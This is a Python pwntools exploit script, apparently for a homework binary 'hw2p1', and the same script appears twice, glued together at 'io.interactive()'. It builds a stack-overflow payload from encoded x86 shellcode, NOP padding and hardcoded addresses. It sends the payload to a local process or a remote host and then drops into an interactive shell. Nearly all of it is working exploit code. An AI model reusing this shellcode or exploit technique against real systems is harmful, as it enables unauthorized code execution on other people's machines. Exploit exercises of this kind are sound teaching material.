#!/usr/bin/env python3
# !/usr/bin/env python2
import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap


def start(argv=[], *a, **kw):
    if pwn.args.GDB:  # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.REMOTE:  # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # run locally, no GDB
        return pwn.process([binPath] + argv, *a, **kw)


binPath = "./hw2p1"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *ultimateQuestion+42
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level = "debug"
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
pwn.context.update(arch='i386', os='linux')

io = start()

# define payload here because it's passed as an argument to the binary:
licensePtr = pwn.p32(0x08049318)
binsh = pwn.p32(0x0804931a)
overFlow = 312 * b'\x90'
overFlow2 = 120 * b'\x90'
Bs = 8 * 'A'
Bs1 = 16 * 'A'
pay2 = b'\xeb\x4e\x5e\x8d\x3e\x31\xc9\xf7\xe1\x31\xed\x8a\x16\x88\xd0\xc0\xea\x04\xc1\xe0\x1c\xc1\xe8\x1c\x28\xc2\x79\x04\xf6\xd2\xfe\xc2\x31\xc0\x31\xdb\x31\xc9\x8a\x44\x2e\x01\x89\xe9\x80\xf1\x32\x74\x24\x88\xc1\x28\xd1\x88\xcb\x88\xc8\xc0\xeb\x04\xc1\xe0\x1c\xc1\xe8\x18\x01\xd8\xb3\xff\x28\xc3\x88\x1f\x47\x83\xc5\x02\xeb\xd0\xe8\xad\xff\xff\xff\x43\xed\x1d\xf4\x40\xfb\x6f\x7a\xa9\x0e\xb6\x0e\xbc\xc9\xe3\x7a\xaf\x7a\x78\x0e\xc5\xda\x76\x6a\x17\x1a\x4e\x68\x38\xc2\x99\xfb\x35\x68\x84\xd2\xb3\xcb\x7c\x68\x78\xe2\x9a\xf5\xe9\x50\xc0\x24\x91\xf8\xfe'
# pay1= b'\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81\xef\x62\xae\x61\x69\x57\xff\xd4'    
buffer = pwn.flat(
    [
        pay2,
        overFlow,
        licensePtr,
        Bs1,
        binsh,

    ]
)

pwn.info("buffer len: %d", len(buffer))
io.sendline(buffer)

io.interactive()#!/usr/bin/env python3
#!/usr/bin/env python2
import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap


def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] +argv, gdbscript=gdbscript,  *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath]+argv, *a, **kw)
        
binPath="./hw2p1"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *ultimateQuestion+42
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="debug"
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
pwn.context.update(arch='i386', os='linux')

io = start()


# define payload here because it's passed as an argument to the binary:
licensePtr=pwn.p32(0x08049318)
binsh=pwn.p32(0x0804931a)
overFlow = 312*b'\x90'
overFlow2 = 120*b'\x90'
Bs = 8 * 'A'
Bs1 = 16 * 'A'
pay2=b'\xeb\x4e\x5e\x8d\x3e\x31\xc9\xf7\xe1\x31\xed\x8a\x16\x88\xd0\xc0\xea\x04\xc1\xe0\x1c\xc1\xe8\x1c\x28\xc2\x79\x04\xf6\xd2\xfe\xc2\x31\xc0\x31\xdb\x31\xc9\x8a\x44\x2e\x01\x89\xe9\x80\xf1\x32\x74\x24\x88\xc1\x28\xd1\x88\xcb\x88\xc8\xc0\xeb\x04\xc1\xe0\x1c\xc1\xe8\x18\x01\xd8\xb3\xff\x28\xc3\x88\x1f\x47\x83\xc5\x02\xeb\xd0\xe8\xad\xff\xff\xff\x43\xed\x1d\xf4\x40\xfb\x6f\x7a\xa9\x0e\xb6\x0e\xbc\xc9\xe3\x7a\xaf\x7a\x78\x0e\xc5\xda\x76\x6a\x17\x1a\x4e\x68\x38\xc2\x99\xfb\x35\x68\x84\xd2\xb3\xcb\x7c\x68\x78\xe2\x9a\xf5\xe9\x50\xc0\x24\x91\xf8\xfe'
#pay1= b'\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81\xef\x62\xae\x61\x69\x57\xff\xd4'    
buffer = pwn.flat(
        [
            pay2,
            overFlow,
            licensePtr,
            Bs1,
            binsh,
            
            ]
        )

pwn.info("buffer len: %d",len(buffer))
io.sendline(buffer)

io.interactive()

